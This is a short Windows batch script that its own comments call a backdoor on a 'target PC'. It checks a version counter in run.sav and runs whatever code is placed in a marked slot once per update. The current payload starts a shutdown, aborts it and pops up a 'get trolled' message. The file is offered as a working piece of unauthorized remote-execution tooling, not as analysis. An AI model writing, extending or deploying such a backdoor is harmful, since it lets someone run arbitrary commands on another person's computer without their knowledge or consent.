set number=1
< run.sav (
  set /p number=
)
:: ADD 1 TO UPDATE TO RUN THE CODE ::
set update=3
if %number% equ %update% (goto end)
:: do not use the command exit, this will dissabled the backdoor on the target PC untill it is restarted
:: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
shutdown /s
timeout 10 /NOBREAK>nul
shutdown /a
echo shutdown aborted>message.txt
echo get trolled>>message.txt
start message.txt
timeout 1
del message.txt



:: END CODE HERE ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo %update% >run.sav
:end
timeout 1 >nul
exit /b
